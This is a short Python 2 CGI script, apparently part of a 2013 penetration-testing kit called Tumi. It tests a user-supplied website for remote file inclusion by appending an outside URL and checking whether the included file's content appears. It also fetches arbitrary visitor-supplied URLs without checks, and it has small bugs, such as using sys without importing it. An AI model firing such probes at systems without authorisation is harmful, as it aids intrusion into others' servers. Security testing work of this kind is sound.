#!/usr/bin/python 
 
#Tumi (c) 2013 at_rfi.py

import httplib2 
import urllib2 
import re 
import cgi
import cgitb
cgitb.enable()

# GET
form   = cgi.FieldStorage()
url = form.getvalue("url")

# HTML HEADERS
print "Content-Type: text/html; charset=UTF-8"	# Print headers
print ""

# HTML 

print '''
<html>
<body>
'''

if 'http://' not in url:  
    url = 'http://' + url 
rfic = url+"http://www.open-sec.com/rfi-tumi.txt" 
http = httplib2.Http() 
req = urllib2.Request(url) 

try: 
	http.request(url) 
except IOError: 
	print "URL not found!" 
	sys.exit() 
else: 
    pass 


print "<textarea style=\"margin: 2px; height: 189px; width: 392px; color: green; background-color: transparent; \">"

response, content = http.request(rfic) 

if response.status == 200: 
	if re.search("Proto",content): 
		
		print rfic + "\nSeems Vulnerable"
		 
	else: 
		print "\nSeems is not vulnerable!" 
	
elif response.status == 404: 
	print rfic + " was not found!" 
else: 
	print response.status



print "</textarea>"

'''
</body>
</html>
'''
